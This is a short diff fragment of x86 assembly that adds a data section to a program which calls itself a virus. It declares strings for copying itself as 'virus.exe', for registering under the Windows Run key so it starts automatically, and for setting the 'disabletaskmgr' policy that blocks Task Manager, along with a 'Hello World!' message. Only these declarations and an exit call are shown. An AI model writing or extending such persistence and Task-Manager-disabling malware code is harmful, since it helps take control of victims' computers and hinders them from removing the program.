@@ -112,3 +112,13 @@ done:
  
     push DWORD 0x00000000
     call [ExitProcess]   ;Exit
+
+;.data
+Key_Value  dd 0x00000001
+Virus_Name  db "\virus.exe",0x00
+Reg_Name  db "Virus",0x00
+Run db "Software\Microsoft\Windows\CurrentVersion\Run",0x00
+Task_Man  db "Software\Microsoft\Windows\CurrentVersion\Policies\System",0x00
+Task_Man_Key db "disabletaskmgr",0x00
+szTitle   db  "Virus:",0x00
+szText   db  "Hello World!",0x00
